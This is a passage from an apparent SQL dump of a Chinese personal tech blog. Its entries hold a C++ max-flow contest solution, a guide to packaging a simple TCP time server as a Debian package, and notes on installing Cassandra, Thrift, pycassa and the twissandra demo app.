path[from][i]=path[from][ path[from][0] ];&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; path[from][0]--;&nbsp;&nbsp;&nbsp; }}int dfs(int point, int x){&nbsp;&nbsp;&nbsp; seq[x]=point;&nbsp;&nbsp;&nbsp; used[point]=true;&nbsp;&nbsp;&nbsp; for(int i=1; i&lt;=path[point][0];i++){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int j = path[point][i];&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(!used[j]){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(j == M){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; seq[x+1]=M;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return ditch[point][j];&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int res = dfs(j, x+1);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(res &gt; 0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return min(ditch[point][j], res);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; used[point]=false;&nbsp;&nbsp;&nbsp; return 0;}int solve(){&nbsp;&nbsp;&nbsp; int total = 0;&nbsp;&nbsp;&nbsp; while(true){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fill_n(seq, M+1, 0);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fill_n(used, M+1, false);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int v = dfs(1, 1);//find max path&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(v == 0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; total += v;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int i=1; seq[i]!=M;i++){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rm(seq[i], seq[i+1], v);//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ditch[seq[i]][seq[i+1]] -= v;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add(seq[i+1], seq[i], v);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; return total;}int main(){&nbsp;&nbsp;&nbsp; ifstream fin(\"ditch.in\");&nbsp;&nbsp;&nbsp; ofstream fout(\"ditch.out\");&nbsp;&nbsp;&nbsp; fin&gt;&gt;N&gt;&gt;M;&nbsp;&nbsp;&nbsp; int a,b,c;&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;N;i++){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fin&gt;&gt;a&gt;&gt;b&gt;&gt;c;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add(a,b,c);&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; fout&lt;&lt;solve()&lt;&lt;endl;&nbsp;&nbsp;&nbsp; return 0;}','',0,'other',0,'','zinnia/_entry_detail.html','entry_detail.html'),(360,'为MiniLinux编写时间服务器软件包','33731937200932712948904',2,'2009-04-27 13:29:48',NULL,'2009-04-27 13:29:48','2014-07-13 18:57:26','编写一个时间服务器程序的deb包<br />编写两个文件Makefile和timed.c<br />$ make static<br />$ sudo make publish<br />注意:在printf后面加上fflush(NULL), 否则在log文件中看不到回应.<br /><br /><br />附Makefile和timed.c<br />#Makefile:<br />all: timed<br />timed: timed.c<br />&nbsp; cc -static timed.c -o timed<br />publish: timed<br />&nbsp; checkinstall --install=no<br />install<br />&nbsp; cp timed /bin<br />&nbsp; echo \'/bin/timed &gt;&gt; /var/log/timed.log 2&gt;&gt;/var/log/timed.err &amp;\'&gt;&gt;/etc/init.d/rc.local<br /><br />//timed.c<br />#include &lt;stdio.h&gt;<br />#include &lt;unistd.h&gt;<br />#include &lt;time.h&gt;<br />#include &lt;string.h&gt;<br />#include &lt;sys/types.h&gt;<br />#include &lt;sys/socket.h&gt;<br />#include &lt;netinet/in.h&gt;<br />#define oops(msg) {perror(msg); _exit(1);}<br />#define PORTNUM 13000<br />#define BUFFLEN 256<br /><br />int main(){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr_in saddr, caddr;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int sock_id, sock_fd;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int len = sizeof(caddr);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; time_t thetime;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char buffer[BUFFLEN];<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sock_id = socket(AF_INET, SOCK_STREAM, 0);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(sock_id == -1)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; oops(\"Socket\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memset((void*) &amp;saddr, 0, sizeof(saddr));<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saddr.sin_family = AF_INET;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saddr.sin_addr.s_addr = INADDR_ANY;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saddr.sin_port = htons(PORTNUM);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(bind(sock_id, (struct sockaddr*)&amp;saddr, sizeof(saddr)) != 0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; oops(\"bind\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(listen(sock_id, 0) != 0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; oops(\"Listen\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(1){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memset((void *)&amp;caddr, 0, sizeof(caddr));<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sock_fd = accept(sock_id, (struct sockaddr*)&amp;caddr,&amp;len);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(sock_fd == 0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; oops(\"Accept\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf(\"Wow!From:%s\\n\", inet_ntoa(caddr.sin_addr));<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fflush(NULL);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; thetime = time(NULL);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sprintf(buffer, \"Hello, Now is %s\\n\", ctime(&amp;thetime));<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; send(sock_fd, buffer,strlen(buffer), 0);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(sock_fd);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(sock_id);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<br />}<br />',1,1,1,0,0,0,'编写一个时间服务器程序的deb包编写两个文件Makefile和timed.c$ make static$ sudo make publish注意:在printf后面加上fflush(NULL), 否则在log文件中看不到回应.附Makefile和timed.c#Makefile:all: timedtimed: timed.c&nbsp; cc -static timed.c -o timedpublish: timed&nbsp; checkinstall --install=noinstall&nbsp; cp timed /bin&nbsp; echo \'/bin/timed &gt;&gt; /var/log/timed.log 2&gt;&gt;/var/log/timed.err &amp;\'&gt;&gt;/etc/init.d/rc.local//timed.c#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;time.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#define oops(msg) {perror(msg); _exit(1);}#define PORTNUM 13000#define BUFFLEN 256int main(){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr_in saddr, caddr;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int sock_id, sock_fd;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int len = sizeof(caddr);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; time_t thetime;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char buffer[BUFFLEN];&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sock_id = socket(AF_INET, SOCK_STREAM, 0);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(sock_id == -1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; oops(\"Socket\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memset((void*) &amp;saddr, 0, sizeof(saddr));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saddr.sin_family = AF_INET;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saddr.sin_addr.s_addr = INADDR_ANY;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saddr.sin_port = htons(PORTNUM);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(bind(sock_id, (struct sockaddr*)&amp;saddr, sizeof(saddr)) != 0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; oops(\"bind\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(listen(sock_id, 0) != 0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; oops(\"Listen\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(1){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memset((void *)&amp;caddr, 0, sizeof(caddr));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sock_fd = accept(sock_id, (struct sockaddr*)&amp;caddr,&amp;len);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(sock_fd == 0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; oops(\"Accept\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf(\"Wow!From:%s\\n\", inet_ntoa(caddr.sin_addr));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fflush(NULL);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; thetime = time(NULL);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sprintf(buffer, \"Hello, Now is %s\\n\", ctime(&amp;thetime));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; send(sock_fd, buffer,strlen(buffer), 0);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(sock_fd);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(sock_id);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;}','',0,'unix',0,'','zinnia/_entry_detail.html','entry_detail.html'),(361,'twissandra，使用Cassandra和django的山寨twitter','33731937201051192614809',2,'2010-06-11 21:26:14',NULL,'2010-06-11 21:26:14','2014-07-13 18:57:26','前几天听网易一个工程师讲到分布式大量数据的存储，讲到了Cassandra，这几天又看了下Hadoop和MapReduce相关的东西，刚好又想把校内的数据抓下来作下分析。<br />上次用MySQL抓了500万条数据，占用了1G多的硬盘空间，后来不了了之，遗忘掉了。<br />这次改了一下表结构，继续抓，不过还是底气不足，估计最多也就抓1千万条就卡住了，刚好趁机试一个Cassandra。<br />安装倒是简单<br />直接从apache下载下来解压运行就行了，目前最新版本是0.6.2，但是所说twissandra是基于0.6.1的，所以就用了0.6.1的<br />wget http://archive.apache.org/dist/cassandra/0.6.1/apache-cassandra-0.6.1-src.tar.gz<br />tar xf apache-cassandra-0.6.1-bin.tar.gz<br />cd apache-cassandra-0.6.1<br />sudo mkdir /var/log/cassandra<br />sudo mkdir /var/lib/cassandra<br />sudo chown `whoami` /var/log/cassandra<br />sudo chown `whoami` /var/lib/cassandra<br />bin/cassandra<br />如果没有看到error消息，cassandra就成功启动了<br />然后进行cli测试<br />bin/cassandra-cli<br />set Keyspx.Standard1[\'hank\'][\'age\'] = \'28\'<br />get Keyspx.Standard1[\'hank\']<br />quit<br /><br />cassandra启动成功，接下来安装twissandra<code><span style=\"font-family: Arial,Helvetica,Sans-Serif;\"><br />首先用git下载源代码<br />git clone git://github.com/ericflo/twissandra.git<br />然后使用twissandra的storage-conf.xml替换cassandra自带的<br />首先关掉cassandra<br />killall java<br />然后替换cassandra的配置文件<br />cp &lt;twissandra&gt;/conf/storage-conf.xml &lt;cassandra&gt;/conf/storage-conf.xml<br />启动cassandra<br />&lt;cassandra&gt;/bin/cassandra<br />启动twissandra<br />cd &lt;twissandra&gt;<br />python manage.py runserver<br />然后用浏览器访问<br />http://localhost:8000/</span></code><br /><br />好像很简单，其实少写了一个很重要的步骤，python访问cassandra，需要Thrist，编译Thrist相当痛苦<br />首先下载Thrist<br />wget http://labs.renren.com/apache-mirror/incubator/thrift/0.2.0-incubating/thrift-0.2.0-incubating.tar.gz<br />tar xf thrift-0.2.0-incubating.tar.gz<br />cd thrift-0.2.0<br />./configure<br />make<br />sudo make install<br />注意：<br />1. 很多文档都说在./configure前有一步./bootstrap，但是我只要一用./bootstrap就失败了，不用反而成功<br />2. thrift需要boost包，sudo apt-get install libboost1.35-dev<br />安装好Thrift后，就可以装pycassa了，好像twissandra自带了pycassa，但我在别的地方有用，所以就装上了<br />git clone http://github.com/vomjom/pycassa.git<br />cd pycassa<br />python setup.py install<br />python setup.py --cassandra install',1,1,1,0,0,0,'前几天听网易一个工程师讲到分布式大量数据的存储，讲到了Cassandra，这几天又看了下Hadoop和MapReduce相关的东西，刚好又想把校内的数据抓下来作下分析。上次用MySQL抓了500万条数据，占用了1G多的硬盘空间，后来不了了之，遗忘掉了。这次改了一下表结构，继续抓，不过还是底气不足，估计最多也就抓1千万条就卡住了，刚好趁机试一个Cassandra。安装倒是简单直接从apache下载下来解压运行就行了，目前最新版本是0.6.2，但是所说twissandra是基于0.6.1的，所以就用了0.6.1的wget http://archive.apache.org/dist/cassandra/0.6.1/apache-cassandra-0.6.1-src.tar.gztar xf apache-cassandra-0.6.1-bin.tar.gzcd apache-cassandra-0.6.1sudo mkdir /var/log/cassandrasudo mkdir /var/lib/cassandrasudo chown `whoami` /var/log/cassandrasudo chown `whoami` /var/lib/cassandrabin/cassandra如果没有看到error消息，cassandra就成功启动了然后进行cli测试bin/cassandra-cliset Keyspx.Standard1[\'hank\'][\'age\'] = \'28\'get Keyspx.Standard1[\'hank\']quitcassandra启动成功，接下来安装twissandra首先用git下载源代码git clone git://github.com/ericflo/twissandra.git然后使用twissandra的storage-conf.xml替换cassandra自带的首先关掉cassandrakillall java然后替换cassandra的配置文件cp &lt;twissandra&gt;/conf/storage-conf.xml &lt;cassandra&gt;/conf/storage-conf.xml启动cassandra&lt;cassandra&gt;/bin/cassandra启动twissandracd &lt;twissandra&gt;python manage.py runserver然后用浏览器访问http://localhost:8000/好像很简单，其实少写了一个很重要的步骤，python访问cassandra，需要Thrist，编译Thrist相当痛苦首先下载Thristwget http://labs.renren.com/apache-mirror/incubator/thrift/0.2.0-incubating/thrift-0.2.0-incubating.tar.gztar xf thrift-0.2.0-incubating.tar.gzcd thrift-0.2.0./configuremakesudo make install注意：1. 很多文档都说在./configure前有一步./bootstrap，但是我只要一用./bootstrap就失败了，不用反而成功2. thrift需要boost包，sudo apt-get install libboost1.35-dev安装好Thrift后，就可以装pycassa了，好像twissandra自带了pycassa，但我在别的地方有用，所以就装上了git clone http://github.com/vomjom/pycassa.gitcd pycassapython setup.py installpython setup.py --cassandra 